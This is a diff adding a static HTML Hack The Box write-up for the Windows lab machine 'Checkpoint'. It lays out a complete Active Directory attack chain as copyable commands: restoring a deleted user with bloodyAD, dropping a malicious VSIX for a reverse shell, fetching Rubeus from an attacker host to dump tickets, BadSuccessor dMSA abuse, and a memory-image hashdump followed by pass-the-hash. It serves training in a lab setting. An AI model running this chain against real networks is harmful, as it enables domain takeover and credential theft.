@@ -1,0 +1,197 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <title>Checkpoint — .d4nx0</title>
+  <link rel="preconnect" href="https://fonts.googleapis.com" />
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
+  <link href="https://fonts.googleapis.com/css2?family=Oxanium:wght@400;500;600;700&family=JetBrains+Mono:wght@400;500;600&display=swap" rel="stylesheet" />
+  <link href="https://unpkg.com/boxicons@2.1.4/css/boxicons.min.css" rel="stylesheet" />
+  <link rel="stylesheet" href="../css/style.css" />
+</head>
+<body>
+  <div class="layout">
+    <aside class="sidebar" id="sidebar">
+      <a href="../index.html" class="sidebar-logo">
+        <div class="logo-icon"><i class="bx bx-terminal"></i></div>
+        <span class="logo-typewriter"><span id="typewriter"></span><span class="cursor-bar"></span></span>
+      </a>
+      <nav class="sidebar-nav">
+        <div class="nav-section">// INDEX</div>
+        <a href="../index.html" class="nav-link"><i class="bx bx-terminal"></i><span>OVERVIEW</span></a>
+        <a href="index.html" class="nav-link active"><i class="bx bx-file"></i><span>WRITEUPS</span></a>
+        <a href="../commands/index.html" class="nav-link"><i class="bx bx-code-alt"></i><span>COMMANDS</span></a>
+        <a href="../techniques/index.html" class="nav-link"><i class="bx bx-target-lock"></i><span>TECHNIQUES</span></a>
+      </nav>
+      <div class="sidebar-footer">
+        <div class="session"><span class="session-dot"></span><span>SESSION ACTIVE</span></div>
+        <button type="button" class="collapse-btn" id="collapseBtn"><i class="bx bx-left-arrow-alt"></i><span>collapse</span></button>
+      </div>
+    </aside>
+    <div class="main">
+      <div class="content">
+        <a href="index.html" class="back-link"><i class="bx bx-left-arrow-alt"></i> Back to writeups</a>
+
+        <div class="note-header">
+          <h1>Checkpoint</h1>
+          <div class="note-meta">
+            <div class="row"> HTB Season <span class="highlight">11</span> Week <span class="highlight">#4</span></div>
+            <div class="row"> Machine <span class="highlight">Checkpoint</span></div>
+            <div class="row"> OS <span class="highlight">Windows</span></div>
+            <div class="row"> Difficulty <span class="highlight">Medium</span></div>
+            <div class="row"> Vulnerabilities [<span class="highlight">Deleted Object Restore</span>] [<span class="highlight">VSIX RCE</span>] [<span class="highlight">BadSuccessor</span>] [<span class="highlight">CVE-2025-53779</span>]</div>
+          </div>
+        </div>
+
+        <div class="note-content">
+          <h2>1. Reconnaissance</h2>
+          <h3>Ports Scan</h3>
+          <pre><code>nmap -sV -A -p- -T4 -oN nmap-result.txt -oX nmap-result.xml <span class="ph">&lt;target-ip&gt;</span></code></pre>
+
+          <p><strong>Key Open Ports:</strong></p>
+          <ul>
+            <li><strong>53/88/389/445/636</strong> – AD DC services (DNS, Kerberos, LDAP, SMB)</li>
+            <li><strong>5985/tcp</strong> – WinRM (HTTPAPI)</li>
+            <li><strong>Host:</strong> <code>DC01</code> · Domain: <code>checkpoint.htb</code></li>
+          </ul>
+
+          <div class="callout info">
+            <strong>💡 Info</strong>
+            Register DC hostnames:
+            <pre><code>echo '<span class="ph">&lt;target-ip&gt;</span> checkpoint.htb dc01.checkpoint.htb DC01.CHECKPOINT.HTB dc01' | sudo tee -a /etc/hosts</code></pre>
+          </div>
+
+          <h3>Provided Credentials &amp; Enum</h3>
+          <p>User: <code>alex.turner</code> / <code>Checkpoint2024!</code></p>
+          <pre><code>nxc smb <span class="ph">&lt;target-ip&gt;</span> -d checkpoint.htb -u alex.turner -p 'Checkpoint2024!'
+nxc smb <span class="ph">&lt;target-ip&gt;</span> -d checkpoint.htb -u alex.turner -p 'Checkpoint2024!' --shares
+nxc smb <span class="ph">&lt;target-ip&gt;</span> -d checkpoint.htb -u alex.turner -p 'Checkpoint2024!' --users</code></pre>
+
+          <p>Interesting share: <strong>DevDrop</strong> (VS Code <code>.vsix</code> packages). Writable AD objects via bloodyAD:</p>
+          <pre><code>python3 -m venv <span class="ph">&lt;venv-name&gt;</span>
+source <span class="ph">&lt;venv-name&gt;</span>/bin/activate
+
+bloodyAD --host DC01.checkpoint.htb -d checkpoint.htb -u alex.turner -p 'Checkpoint2024!' get writable</code></pre>
+
+          <div class="callout warning">
+            <strong>⚠️ WRITE on Mark Davies</strong>
+            <code>alex.turner</code> can write the deleted user <strong>Mark Davies</strong> — restore and clear <code>ACCOUNTDISABLE</code>.
+          </div>
+
+          <pre><code>bloodyAD --host dc01.checkpoint.htb -d checkpoint.htb -u alex.turner -p 'Checkpoint2024!' set restore mark.davies
+bloodyAD --host DC01.checkpoint.htb -d checkpoint.htb -u alex.turner -p 'Checkpoint2024!' remove uac mark.davies -f ACCOUNTDISABLE
+bloodyAD --host DC01.checkpoint.htb -d checkpoint.htb -u alex.turner -p 'Checkpoint2024!' get object mark.davies --attr userAccountControl
+# NORMAL_ACCOUNT; DONT_EXPIRE_PASSWORD; DONT_REQ_PREAUTH</code></pre>
+
+          <p>Password reuse works for <code>mark.davies</code>:</p>
+          <pre><code>nxc smb <span class="ph">&lt;target-ip&gt;</span> -d checkpoint.htb -u mark.davies -p 'Checkpoint2024!' --shares
+# DevDrop → READ,WRITE</code></pre>
+
+          <h2>2. Exploitation</h2>
+          <h3>Malicious VSIX → Shell as <code>ryan.brooks</code></h3>
+          <p>Upload a weaponized <code>.vsix</code> to <strong>DevDrop</strong> (processed by the VS Code extension workflow):</p>
+          <pre><code>nc -lnvp <span class="ph">&lt;port&gt;</span>
+
+impacket-smbclient -dc-ip <span class="ph">&lt;target-ip&gt;</span> 'checkpoint.htb/mark.davies:Checkpoint2024!@<span class="ph">&lt;target-ip&gt;</span>' -debug
+# use DevDrop
+# put payload.vsix</code></pre>
+
+          <p>Shell arrives as <code>ryan.brooks</code>:</p>
+          <pre><code>type C:\Users\ryan.brooks\Desktop\user.txt
+
+Import-Module ActiveDirectory
+Get-ADUser -Identity "svc_deploy" -Properties *
+Get-ADOrganizationalUnit -Filter 'Name -like "*"' | Format-Table Name, DistinguishedName -A</code></pre>
+
+          <h2>3. Privilege Escalation</h2>
+          <h3>BadSuccessor (CVE-2025-53779) → <code>svc_deploy</code></h3>
+          <p>Dump a TGT for <code>ryan.brooks</code> with Rubeus, convert to ccache, then create a malicious dMSA:</p>
+          <pre><code># attacker
+sudo apt install rubeus
+cp /usr/share/windows-resources/rubeus/Rubeus.exe /tmp && cd /tmp && python3 -m http.server
+
+# target
+wget http://<span class="ph">&lt;attacker-ip&gt;</span>:8000/Rubeus.exe -OutFile Rubeus.exe
+.\Rubeus.exe tgtdeleg /nowrap</code></pre>
+
+          <pre><code># attacker — save base64 ticket
+echo "<span class="ph">&lt;Base64-ticket&gt;</span>" | base64 -d > ryan.kirbi
+impacket-ticketConverter ryan.kirbi ryan.ccache
+export KRB5CCNAME=ryan.ccache
+
+bloodyAD --host dc01.checkpoint.htb -d checkpoint.htb -u ryan.brooks -k ccache=ryan.ccache add badSuccessor evil-dmsa -t 'CN=SVC_DEPLOY,OU=SERVICEACCOUNTS,DC=CHECKPOINT,DC=HTB' --ou 'OU=DMSAHolder,DC=checkpoint,DC=htb'
+# RC4 hash of svc_deploy from dMSA previous keys</code></pre>
+
+          <h3>VMBackups → Memory Hashdump → Domain Admin</h3>
+          <pre><code>nxc smb <span class="ph">&lt;target-ip&gt;</span> -d checkpoint.htb -u svc_deploy -H '<span class="ph">&lt;hash-key&gt;</span>' --shares
+# VMBackups READ
+
+smbget "smb://<span class="ph">&lt;target-ip&gt;</span>/VMBackups/NightlyBackup_2024-11-01/memory forensics/Windows Server 2019-Snapshot1.vmem" \
+  -U 'checkpoint.htb/svc_deploy%<span class="ph">&lt;hash-key&gt;</span>' \
+  --pw-nt-hash \
+  --resume
+
+vol -f "Windows Server 2019-Snapshot1.vmem" windows.hashdump.Hashdump | grep -i Administrator
+# Administrator:500:aad3b435b51404eeaad3b435b51404ee:<span class="ph">&lt;NT-HASH&gt;</span>:::
+
+evil-winrm -i checkpoint.htb -u Administrator -H <span class="ph">&lt;NT-HASH&gt;</span>
+type C:\Users\max.palmer\Desktop\root.txt</code></pre>
+
+          <h2>4. Flag Paths</h2>
+          <ul>
+            <li><strong>User flag:</strong> <code>C:\Users\ryan.brooks\Desktop\user.txt</code></li>
+            <li><strong>Root flag:</strong> <code>C:\Users\max.palmer\Desktop\root.txt</code></li>
+          </ul>
+
+          <div class="callout info">
+            <strong>✅ Lessons Learned</strong>
+            Restoring a deleted user with WRITE rights and password reuse unlocked a writable <code>DevDrop</code> share — a perfect drop for a malicious VSIX. From <code>ryan.brooks</code>, BadSuccessor (CVE-2025-53779) recovered <code>svc_deploy</code>’s RC4 hash, which could read VM memory backups. Volatility hashdump of a domain admin from a snapshot closed the chain. Treat deleted-object ACLs, extension drop shares, and dMSA permissions as high-value attack surface; encrypt or isolate backup memory images.
+          </div>
+        </div>
+
+      </div>
+      <footer class="page-footer">// NOTES ARE STATIC, VERSIONED IN GIT — EDIT HTML AND PUSH</footer>
+    </div>
+  </div>
+  <button type="button" class="mobile-toggle" id="mobileToggle" aria-label="Menu"><i class="bx bx-menu"></i></button>
+  <script src="../js/app.js"></script>
+  <script>
+    document.querySelectorAll('.note-content pre code').forEach(function (block) {
+      var html = block.innerHTML;
+      html = html.replace(/^(# .*)/gm, '<span class="comment">$1</span>');
+      var commands = ['wget','python3','sudo','nmap','ssh','nxc','bloodyAD','impacket-smbclient','impacket-ticketConverter','evil-winrm','smbget','vol','export','echo','base64','cp','cd','type','Get-ADUser','Import-Module','source'];
+      var regex = new RegExp('\\b(' + commands.join('|') + ')\\b(?= |$)', 'gm');
+      html = html.replace(regex, '<span class="cmd">$1</span>');
+      block.innerHTML = html;
+    });
+    document.querySelectorAll('.note-content pre').forEach(function (pre) {
+      if (pre.parentElement && pre.parentElement.classList.contains('code-wrap')) return;
+      var wrap = document.createElement('div');
+      wrap.className = 'code-wrap';
+      pre.parentNode.insertBefore(wrap, pre);
+      wrap.appendChild(pre);
+      var btn = document.createElement('button');
+      btn.type = 'button';
+      btn.className = 'copy-btn';
+      btn.textContent = 'Copy';
+      btn.addEventListener('click', function () {
+        var code = pre.querySelector('code');
+        var text = code ? code.innerText : pre.innerText;
+        navigator.clipboard.writeText(text).then(function () {
+          btn.textContent = 'Copied!';
+          btn.classList.add('copied');
+          setTimeout(function () { btn.textContent = 'Copy'; btn.classList.remove('copied'); }, 2000);
+        });
+      });
+      wrap.appendChild(btn);
+    });
+    function toggleZoom(img) {
+      img.classList.toggle('expanded');
+      if (img.classList.contains('expanded')) {
+        setTimeout(function () { img.scrollIntoView({ behavior: 'smooth', block: 'center' }); }, 100);
+      }
+    }
+  </script>
+</body>
+</html>
